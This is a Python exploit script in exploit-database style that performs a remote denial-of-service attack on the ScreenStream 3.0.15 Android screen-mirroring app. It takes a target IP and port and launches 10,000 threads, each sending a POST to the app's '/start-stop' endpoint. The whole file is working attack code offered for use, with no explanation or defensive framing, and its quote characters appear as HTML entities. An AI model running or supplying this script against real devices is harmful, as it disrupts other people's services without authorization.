#coding: utf-8

# ************************************************************************
# *                Author: Marcelo Vázquez (aka s4vitar)                 *
# *         ScreenStream 3.0.15 Remote Denial of Service (DoS)           *
# ************************************************************************

# Exploit Title: ScreenStream 3.0.15 Remote Denial of Service (DoS)
# Date: 2019-02-21
# Exploit Author: Marcelo Vázquez (aka s4vitar)
# Vendor Homepage: http://mobzapp.com/mirroring/index.html
# Software Link: https://play.google.com/store/apps/details?id=info.dvkr.screenstream&hl=en
# Version: <= ScreenStream 3.0.15
# Tested on: Android

import sys, requests, threading, signal

def handler(signum, frame):
        print &#039;\nFinishing program...\n&#039;
        sys.exit(0)

if len(sys.argv) != 3:
	print "\nUsage: python " + sys.argv[0] + " <ip_address> <port>\n"
	print "Example: python " + sys.argv[0] + " 192.168.1.125 8080\n"
	sys.exit(0)

def startAttack(url):
	url_destination = url + &#039;/start-stop&#039;
	headers = {&#039;Accept-Encoding&#039;: &#039;gzip, deflate&#039;, &#039;Accept-Language&#039;: &#039;en-US,en;q=0.5&#039;, &#039;User-Agent&#039;: &#039;Mozilla/5.0 (X11; Linux x86_64; rv:64.0) Gecko/20100101 Firefox/64.0&#039;, &#039;Accept&#039;: &#039;*/*&#039;, &#039;Referer&#039;: url, &#039;Connection&#039;: &#039;close&#039;}

	r = requests.post(url_destination, headers=headers)

if __name__ == &#039;__main__&#039;:

	signal.signal(signal.SIGINT, handler)
	url = &#039;http://&#039; + sys.argv[1] + &#039;:&#039; + sys.argv[2]

	threads = []

	for i in xrange(0, 10000):
		t = threading.Thread(target=startAttack, args=(url,))
		threads.append(t)

	for x in threads:
		x.start()

	for x in threads:
		x.join()

